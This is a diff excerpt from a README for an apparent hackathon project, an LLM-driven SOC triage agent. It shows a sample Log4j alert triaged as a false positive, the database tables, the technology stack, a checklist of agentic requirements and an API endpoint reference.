+       ├──► lookup_asset_inventory("10.0.4.22")
+       │    └── Python 3.10 / FastAPI / Uvicorn — NO Java runtime, NO Log4j
+       │
+       ├──► query_server_logs("10.0.4.22")
+       │    └── HTTP 401 Unauthorized — No outbound socket connections created
+       │
+  [CONDITION MISMATCH DETECTED]
+  Exploit requires JVM + Log4j. Target has neither. Attack cannot execute.
+       │
+  [REPLAN] ─── Verdict: FALSE_POSITIVE / INCOMPATIBLE_STACK
+               Action:  NO firewall block (avoids disrupting valid traffic)
+               Record:  Zero erroneous drops enforced
+```
+
+### Database Schema (11 Tables)
+
+| Table | Description |
+|-------|-------------|
+| `soc_alerts` | Ingested NIDS events — signature, severity, source/dest IPs, raw payload |
+| `soc_assets` | CMDB inventory — OS, services, installed packages, WAF status |
+| `soc_cve_kb` | CVE intelligence — CVSS score, affected products, remediation |
+| `soc_server_logs` | Endpoint telemetry — HTTP access, auth logs, EDR process trees |
+| `soc_firewall_rules` | Netfilter containment rules — active drop rules, packet counters |
+| `soc_investigations` | Incident reports — MITRE mapping, confidence score, evidence summary |
+| `execution_logs` | Full audit trace — every tool call with args, result, latency |
+| `tool_usage_stats` | Tool performance — call counts, success/failure rates, avg latency |
+| `app_config` | System policy — reasoning depth, confidence thresholds |
+| `chat_sessions` | Agent conversation sessions |
+| `chat_messages` | Agent conversation history with tool call transcripts |
+
+### Technology Stack
+
+| Layer | Technology |
+|-------|-----------|
+| **Backend** | Node.js + Express.js |
+| **Agent Reasoning** | Groq LPU — LLaMA 3.3 70B Versatile |
+| **Database** | Neon Serverless PostgreSQL (AWS ap-southeast-1) |
+| **Frontend** | Vanilla HTML/CSS/JavaScript (zero framework dependencies) |
+| **Streaming** | Server-Sent Events (SSE) for real-time agent token streaming |
+| **Standards** | NIST SP 800-61, MITRE ATT&CK, MITRE D3FEND |
+
+---
+
+## ✅ Common Agentic Requirements Compliance
+
+| # | Requirement | Implementation | Verification |
+|---|-------------|----------------|-------------|
+| **1** | Goal-driven multi-turn execution | Accepts operational goals; runs up to 16-turn ReAct loop autonomously | Live SSE stream at `/api/soc/investigate/stream` |
+| **2** | Meaningful tool/environment interaction | 8 tools querying live Neon PostgreSQL — zero static mocks | SQL queries visible in `execution_logs` table |
+| **3** | Persistent state across turns & sessions | All reasoning steps, tool calls, verdicts stored in PostgreSQL | Tables: `soc_investigations`, `execution_logs`, `chat_messages` |
+| **4** | Action → Observation → Replanning | Agent re-evaluates hypothesis after each tool observation | Demonstrated in `AutonomousSocAgent.investigate()` |
+| **5** | Objective outcome verification | `verify_defense_state` probes Netfilter sandbox, returns real packet drop counts | `/api/soc/firewall/probe` returns `RST_SENT_PACKETS_DROPPED` |
+| **6** | Failure / changed-condition handling | Log4j vs. Python FastAPI → agent detects incompatibility → replans to `FALSE_POSITIVE` | 1-click demo in Agentic Evaluator tab |
+| **7** | Open, modular architecture | Network Ingestion → Groq Kernel → 8 Tools → PostgreSQL → Netfilter Sandbox | Documented via `/api/health` and `/api/soc/config` |
+
+---
+
+## 📡 API Reference
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/health` | `GET` | Platform health, DB status, tools, uptime |
+| `/api/soc/stats` | `GET` | SOC telemetry metrics, MTTD/MTTR |
+| `/api/soc/agentic-status` | `GET` | All 7 Common Agentic Requirements status |
+| `/api/soc/alerts` | `GET`, `POST` | List alerts or ingest new test event |
+| `/api/soc/alerts/:id` | `GET` | Fetch specific alert with decoded payload |
+| `/api/soc/assets` | `GET` | CMDB asset inventory |
+| `/api/soc/cve` | `GET` | CVE knowledge base (`?q=search`) |
+| `/api/soc/logs` | `GET` | Server logs (`?host_ip=&log_type=&limit=`) |
+| `/api/soc/firewall` | `GET` | Active containment rules |
+| `/api/soc/firewall/rule` | `POST` | Deploy manual firewall rule |
+| `/api/soc/firewall/toggle` | `POST` | Toggle rule `is_active` state |
+| `/api/soc/firewall/probe` | `POST` | Run objective defense verification |
+| `/api/soc/investigations` | `GET` | Historical investigation reports |
+| `/api/soc/investigate/stream` | `POST` | **SSE stream** — live agent ReAct reasoning |
+| `/api/soc/override` | `POST` | Submit analyst human override |
+| `/api/soc/config` | `GET`, `POST` | System policy configuration |
+| `/api/search` | `GET` | Global search across alerts, rules, assets |
+
+---
+
+## 📄 License
+
 Distributed under the [MIT License](LICENSE).  
-Built for hackathon demonstration under **Track 5: Cybersecurity (Problem Statement 9)**.  
-All attack payloads and containment actions are executed within an isolated, sandboxed emulation environment.
+Built for hackathon demonstration — **Track 5: Cybersecurity (Problem Statement 9)**.  
+All attack payloads and containment actions execute within an isolated sandboxed emulation environment.
